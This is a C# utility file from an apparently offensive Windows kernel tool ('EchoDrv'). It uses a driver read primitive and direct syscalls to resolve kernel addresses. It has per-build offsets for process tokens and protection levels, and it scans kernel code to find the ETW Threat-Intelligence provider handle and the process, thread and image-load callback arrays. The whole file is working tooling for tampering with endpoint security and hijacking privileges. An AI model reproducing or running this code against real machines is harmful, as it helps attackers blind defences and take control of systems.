using Microsoft.Win32;
using ISyscall;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;


namespace EchoDrv
{
    internal class Utils
    {
        [DllImport("psapi")]
        static extern bool EnumDeviceDrivers([MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)][In][Out] IntPtr[] ddAddresses, UInt32 arraySizeBytes, [MarshalAs(UnmanagedType.U4)] out UInt32 bytesNeeded);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("psapi")]
        private static extern int GetDeviceDriverBaseNameA(IntPtr ddAddress, StringBuilder ddBaseName, int baseNameStringSizeChars);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS NtQuerySystemInformation(uint SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, out int ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr LdrGetProcedureAddress(IntPtr hModule, IntPtr FunctionName, IntPtr Ordinal, ref IntPtr FunctionAddress);

        struct SYSTEM_MODULES
        {
            IntPtr Reserved1;
            IntPtr Reserved2;
            internal IntPtr ImageBase;
            internal uint ImageSize;
            uint Flags;
            UInt16 Id;
            UInt16 Rank;
            UInt16 w018;
            internal UInt16 NameOffset;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 255)]
            internal Char[] _ImageName;
            internal String ImageName
            {
                get
                {
                    return new String(_ImageName).Split(new Char[] { '\0' }, 2)[0];
                }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SYSTEM_MODULE_INFORMATION
        {
            internal UInt32 NumberOfModules;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 200)]
            internal SYSTEM_MODULES[] Modules;
        }



        //Common stuff
        private static IntPtr GetKernelBase()
        {
            IntPtr ntquerysys = Program.isyscall.GetSyscallPtr("NtQuerySystemInformation");
            int nHandleInfoSize = 0x4;
            IntPtr ModuleTableInformation = Marshal.AllocHGlobal((int)nHandleInfoSize);
            int nLength = 0;
            IntPtr ipHandle = IntPtr.Zero;
            Data.NTSTATUS queryResult;

            NtQuerySystemInformation NTQSI = (NtQuerySystemInformation)Marshal.GetDelegateForFunctionPointer(ntquerysys, typeof(NtQuerySystemInformation));
            while ((queryResult = NTQSI(11, ModuleTableInformation, nHandleInfoSize, out nLength)) == Data.NTSTATUS.InfoLengthMismatch)
            {
                nHandleInfoSize = nLength;
                Marshal.FreeHGlobal(ModuleTableInformation);
                ModuleTableInformation = Marshal.AllocHGlobal((int)(nLength *= 2));
            }

            SYSTEM_MODULE_INFORMATION sm = (SYSTEM_MODULE_INFORMATION)Marshal.PtrToStructure(ModuleTableInformation, typeof(SYSTEM_MODULE_INFORMATION));
            for (Int32 i = 0; i < sm.NumberOfModules; i++)
            {
                if (sm.Modules[i].ImageName.ToLower().EndsWith("ntoskrnl.exe"))
                {
                    Marshal.FreeHGlobal(ModuleTableInformation);
                    return sm.Modules[i].ImageBase;
                }
            }

            Marshal.FreeHGlobal(ModuleTableInformation);
            return IntPtr.Zero;
        }

        internal static IntPtr GetKrnlProcAddress(string funcname)
        {
            IntPtr kbase = GetKernelBase();
            if (kbase == IntPtr.Zero)
            {
                Console.WriteLine("Failed to get kernel base");
                return IntPtr.Zero;
            }

            IntPtr Ntoskrnl = LoadLibrary("ntoskrnl.exe");
            IntPtr funcptr = (IntPtr)0;
            IntPtr func_address = (IntPtr)0;
            long funcptroffset = 0;
            Data.ANSI_STRING aFunc = new Data.ANSI_STRING
            {
                Length = (ushort)funcname.Length,
                MaximumLength = (ushort)(funcname.Length + 2),
                Buffer = Marshal.StringToCoTaskMemAnsi(funcname)
            };

            IntPtr pAFunc = Marshal.AllocHGlobal(Marshal.SizeOf(aFunc));
            Marshal.StructureToPtr(aFunc, pAFunc, true);

            LdrGetProcedureAddress LGPA = (LdrGetProcedureAddress)Marshal.GetDelegateForFunctionPointer(Isyscall.GetExportAddress("LdrGetProcedureAddress"), typeof(LdrGetProcedureAddress));
            LGPA(Ntoskrnl, pAFunc, IntPtr.Zero, ref funcptr);
            FreeLibrary(Ntoskrnl);
            if (funcptr == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            funcptroffset = funcptr.ToInt64() - Ntoskrnl.ToInt64();


            funcptr = (IntPtr)(kbase.ToInt64() + funcptroffset);

            return funcptr;
        }

        internal static string findDriver(IntPtr CallbackAddr)
        {

            string drvname = "";
            StringBuilder sb = new StringBuilder(1000);
            uint bytesNeeded = 0;

            if (EnumDeviceDrivers(null, 0, out bytesNeeded))
            {
                UInt32 arraySize = bytesNeeded / (uint)IntPtr.Size;
                UInt32 arraySizeBytes = bytesNeeded;
                IntPtr[] ddAddresses = new IntPtr[arraySize];
                List<long> list = new List<long>();
                EnumDeviceDrivers(ddAddresses, arraySizeBytes, out bytesNeeded);

                for (int i = 0; i < arraySize - 1; i++)
                {
                    if (((long)CallbackAddr > (long)ddAddresses[i]) && ((long)CallbackAddr < (long)ddAddresses[i + 1]))
                    {
                        list.Add((long)ddAddresses[i]);
                    }
                }

                if (list.Count() > 0)
                {
                    long closest = list.OrderBy(v => Math.Abs((long)v - (long)CallbackAddr)).First();

                    if (GetDeviceDriverBaseNameA((IntPtr)closest, sb, sb.Capacity) > 0)
                    {
                        drvname = sb.ToString();
                        sb.Clear();
                    }
                }
            }

            return drvname;
        }

        internal static IntPtr GetTargetProcAddress(Data.Offsets p_offsets, IntPtr p_psInitialSystemProcessAddress, IntPtr p_targetPID)
        {
            IntPtr targetaddr = IntPtr.Zero;
            IntPtr head = (IntPtr)(p_psInitialSystemProcessAddress.ToInt64() + (long)p_offsets.ActiveProcessLinksOffset);
            IntPtr current = head;
            IntPtr tmpbuf;

            do
            {
                tmpbuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
                IntPtr processAddress = new IntPtr((current.ToInt64() - (long)p_offsets.ActiveProcessLinksOffset));
                IntPtr uniqueProcessId = Marshal.ReadIntPtr(Driver.readPrimitive(new IntPtr((long)processAddress + (long)p_offsets.UniqueProcessIdOffset), tmpbuf, (uint)Marshal.SizeOf(typeof(IntPtr))));


                if (uniqueProcessId == p_targetPID)
                {
                    return new IntPtr((current.ToInt64() - (long)p_offsets.ActiveProcessLinksOffset));
                }
                current = Marshal.ReadIntPtr(Driver.readPrimitive(new IntPtr((long)processAddress + (long)p_offsets.ActiveProcessLinksOffset), tmpbuf, (uint)Marshal.SizeOf(typeof(IntPtr))));


            } while (current != head);

            Marshal.FreeHGlobal(tmpbuf);
            return targetaddr;
        }

        internal static bool getVersionOffsets(out Data.Offsets p_offsets)
        {
            p_offsets = new Data.Offsets();
            RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
            var version = key.GetValue("CurrentBuild");
            Console.WriteLine("[+] Windows version found : " + version);

            switch (Convert.ToInt32(version))
            {
                case 10240: // Gold
                    p_offsets.UniqueProcessIdOffset = 0x02e8;
                    p_offsets.ActiveProcessLinksOffset = 0x02f0;
                    p_offsets.SignatureLevelOffset = 0x06a8;
                    p_offsets.ProcessToken = 0x358;
                    p_offsets.ETWGuidEntry = 0x20;
                    p_offsets.ETWProviderEnableInfo = 0x50;
                    return true;
                case 10586: // 2015 update
                    p_offsets.UniqueProcessIdOffset = 0x02e8;
                    p_offsets.ActiveProcessLinksOffset = 0x02f0;
                    p_offsets.SignatureLevelOffset = 0x06b0;
                    p_offsets.ProcessToken = 0x358;
                    p_offsets.ETWGuidEntry = 0x20;
                    p_offsets.ETWProviderEnableInfo = 0x50;
                    return true;
                case 14393: // 2016 update
                    p_offsets.UniqueProcessIdOffset = 0x02e8;
                    p_offsets.ActiveProcessLinksOffset = 0x02f0;
                    p_offsets.SignatureLevelOffset = 0x06c8;
                    p_offsets.ProcessToken = 0x358;
                    p_offsets.ETWGuidEntry = 0x20;
                    p_offsets.ETWProviderEnableInfo = 0x50;
                    return true;
                case 15063: // April 2017 update
                case 16299: // Fall 2017 update
                case 17134: // April 2018 update
                case 17763: // October 2018 update
                    p_offsets.UniqueProcessIdOffset = 0x02e0;
                    p_offsets.ActiveProcessLinksOffset = 0x02e8;
                    p_offsets.SignatureLevelOffset = 0x06c8;
                    p_offsets.ProcessToken = 0x358;
                    p_offsets.ETWGuidEntry = 0x20;
                    p_offsets.ETWProviderEnableInfo = 0x50;
                    return true;
                case 18362: // May 2019 update
                case 18363: // November 2019 update
                    p_offsets.UniqueProcessIdOffset = 0x02e8;
                    p_offsets.ActiveProcessLinksOffset = 0x02f0;
                    p_offsets.SignatureLevelOffset = 0x06f8;
                    p_offsets.ProcessToken = 0x360;
                    p_offsets.ETWGuidEntry = 0x20;
                    p_offsets.ETWProviderEnableInfo = 0x50;
                    return true;
                case 19041: // May 2020 update
                case 19042: // October 2020 update
                case 19043: // May 2021 update
                case 19044: // October 2021 update
                case 19045:
                case 22000: // Win 11 June/September 2021
                    p_offsets.UniqueProcessIdOffset = 0x0440;
                    p_offsets.ActiveProcessLinksOffset = 0x0448;
                    p_offsets.SignatureLevelOffset = 0x0878;
                    p_offsets.ProcessToken = 0x4b8;
                    p_offsets.ETWGuidEntry = 0x20;
                    p_offsets.ETWProviderEnableInfo = 0x60;
                    return true;
                default:
                    Console.WriteLine("[-] Unknown offsets for this Windows build. Perhaps add them yourself?");
                    break;
            }

            return false;
        }


        // ETW STUFF
        internal static IntPtr getEtwThreatIntProvRegHandleAddr()
        {
            //48 8d 1d e0 fa 96 ff
            IntPtr EtwFuncAddr = GetKrnlProcAddress("KeInsertQueueApc");

            IntPtr EtwThreatIntProvRegHandle = IntPtr.Zero;
            int count = 0;
            IntPtr buffer = IntPtr.Zero;
            byte[] barray = new byte[3];
            int offset = 0;

            while (count <= 200)
            {
                buffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
                IntPtr tmp = Driver.readPrimitive(EtwFuncAddr, buffer, 3);
                barray[0] = Marshal.ReadByte(tmp, 0);
                barray[1] = Marshal.ReadByte(tmp, 1);
                barray[2] = Marshal.ReadByte(tmp, 2);

                if (barray[0] == 0x48 && barray[1] == 0x8B && barray[2] == 0x0D)
                {
                    offset = Marshal.ReadInt32(Driver.readPrimitive(EtwFuncAddr + 0x3, buffer, 4));
                    break;

                }

                EtwFuncAddr = new IntPtr(EtwFuncAddr.ToInt64() + 1);
                if (count == 200)
                {
                    Console.WriteLine("ETWTI signature not found.");
                    return IntPtr.Zero;
                }
                count++;
            }

            EtwThreatIntProvRegHandle = new IntPtr(EtwFuncAddr.ToInt64() + 0x7 + offset);
            Console.WriteLine("[+] Found EtwThreatIntProvRegHandle addr: " + EtwThreatIntProvRegHandle.ToString("X"));
            Marshal.FreeHGlobal(buffer);

            return EtwThreatIntProvRegHandle;
        }


        //CALLBACKS STUFF
        //https://github.com/JustaT3ch/Kernel-Snooping/blob/main/kernel_snooping/byte_scan.cpp      

        internal static IntPtr get_PspCallbacksNotifyRoutine_arr(string callback_type)
        {
            IntPtr PspSetCallbacksNotifyRoutineAddr = IntPtr.Zero;

            IntPtr PspCallbacksNotifyRoutine_array_address = IntPtr.Zero;

            if (callback_type.Equals("process"))
            {
                PspSetCallbacksNotifyRoutineAddr = getPspSetCallbacksNotifyRoutine("PsSetCreateProcessNotifyRoutine");
            }
            else if (callback_type.Equals("thread"))
            {
                PspSetCallbacksNotifyRoutineAddr = getPspSetCallbacksNotifyRoutine("PsSetCreateThreadNotifyRoutine");
            }
            else if (callback_type.Equals("image"))
            {
                PspSetCallbacksNotifyRoutineAddr = getPspSetCallbacksNotifyRoutine("PsSetLoadImageNotifyRoutine");
            }
            else
            {
                Console.WriteLine("Missing Callback array name! [process|thread|image|handle]");
                return IntPtr.Zero;
            }

            if (PspSetCallbacksNotifyRoutineAddr == IntPtr.Zero)
            {
                Console.WriteLine($"Getting {callback_type} callbacks array ptr failed.");
                return IntPtr.Zero;
            }

            // Locate LEA instruction -> First 2 bytes: 0x4C , 0x8D
            // the third byte is taken from the set: 0x05 , 0x0D , 0x15 , 0x1D , 0x25 , 0x2D , 0x35 , 0x3D
            int count = 0;
            IntPtr buffer = Marshal.AllocHGlobal(3);
            byte[] barray = new byte[3];
            byte searchbyte1 = 0x4C;
            byte searchbyte2 = 0x8D;
            bool stop = false;
            IntPtr back = PspSetCallbacksNotifyRoutineAddr;
            while (count <= 200)
            {
                IntPtr tmp = Driver.readPrimitive(PspSetCallbacksNotifyRoutineAddr, buffer, 3);
                barray[0] = Marshal.ReadByte(tmp, 0);
                barray[1] = Marshal.ReadByte(tmp, 1);
                barray[2] = Marshal.ReadByte(tmp, 2);

                if ((barray[0] == searchbyte1 && barray[1] == searchbyte2))
                {
                    if ((barray[2] == 0x0D) || (barray[2] == 0x15) || (barray[2] == 0x1D) || (barray[2] == 0x25) || (barray[2] == 0x2D) || (barray[2] == 0x35) || (barray[2] == 0x3D))
                    {
                        break;
                    }
                }

                PspSetCallbacksNotifyRoutineAddr = new IntPtr(PspSetCallbacksNotifyRoutineAddr.ToInt64() + 1);
                if (count == 200)
                {
                    searchbyte1 = 0x48;
                    count = -1;
                    PspSetCallbacksNotifyRoutineAddr = back;
                    if (stop)
                    {
                        Console.WriteLine($"LEA to {callback_type} callback array not found");
                        return IntPtr.Zero;
                    }
                    stop = true;
                };
                count++;
            }

            IntPtr rip_address = PspSetCallbacksNotifyRoutineAddr;
            ulong offset = 0;
            // get the offset bytes

            for (int i = 6, k = 24; i > 2; i--, k = k - 8)
            {

                byte offset_byte = (byte)Marshal.ReadByte(Driver.readPrimitive(PspSetCallbacksNotifyRoutineAddr + i, buffer, 1));

                offset = ((ulong)offset_byte << k) + offset;

            }

            // check sign bit
            if ((offset & 0x00000000ff000000) == 0x00000000ff000000)
                offset = offset | 0xffffffff00000000; // sign extend in case of a negative offset


            // Calculate the address of PspSetCreateProcessNotifyRoutine
            PspCallbacksNotifyRoutine_array_address = new IntPtr(rip_address.ToInt64() + (long)offset + 7);
            Console.WriteLine($"[+] {callback_type} callbacks array address : " + PspCallbacksNotifyRoutine_array_address.ToString("X"));

            Marshal.FreeHGlobal(buffer);
            return PspCallbacksNotifyRoutine_array_address;
        }

        private static IntPtr getPspSetCallbacksNotifyRoutine(string callbackfunc)
        {
            IntPtr PspSetCallbackssNotifyRoutineAddr = IntPtr.Zero;
            IntPtr PsSetCallbacksNotifyRoutine_address = Utils.GetKrnlProcAddress(callbackfunc);
            Console.WriteLine("[+] PsSet_NotifyRoutine address : " + PsSetCallbacksNotifyRoutine_address.ToString("X"));
            IntPtr buffer = IntPtr.Zero;
            int count = 0;

            //while (b != 0xE8 || b != 0xE9)
            while (count <= 200)
            {
                buffer = Marshal.AllocHGlobal(1);
                byte b = (byte)Marshal.ReadByte(Driver.readPrimitive(PsSetCallbacksNotifyRoutine_address, buffer, 1));
                if (b == 0xE8 || b == 0xE9)
                {
                    ;
                    break;
                }

                PsSetCallbacksNotifyRoutine_address = new IntPtr(PsSetCallbacksNotifyRoutine_address.ToInt64() + 1);
                if (count == 200)
                {
                    Console.WriteLine("CALL/JMP not found, exiting..");
                    return IntPtr.Zero;
                }
                count++;
            }

            IntPtr rip_address = PsSetCallbacksNotifyRoutine_address;
            ulong offset = 0;

            // Get the offset bytes
            for (int i = 4, k = 24; i > 0; i--, k = k - 8)
            {

                byte offset_byte = (byte)Marshal.ReadByte(Driver.readPrimitive(PsSetCallbacksNotifyRoutine_address + i, buffer, 1));

                offset = ((ulong)offset_byte << k) + offset;
            }

            Marshal.FreeHGlobal(buffer);
            // check sign bit
            if ((offset & 0x00000000ff000000) == 0x00000000ff000000)
                offset = offset | 0xffffffff00000000; // sign extend in case of a negative offset

            // Calculate the address of PspSetCreateProcessNotifyRoutine
            PspSetCallbackssNotifyRoutineAddr = new IntPtr(rip_address.ToInt64() + (long)offset + 5);
            Console.WriteLine("[+] PspSet_NotifyRoutine address : " + PspSetCallbackssNotifyRoutineAddr.ToString("X"));
            return PspSetCallbackssNotifyRoutineAddr;
        }
    }
}
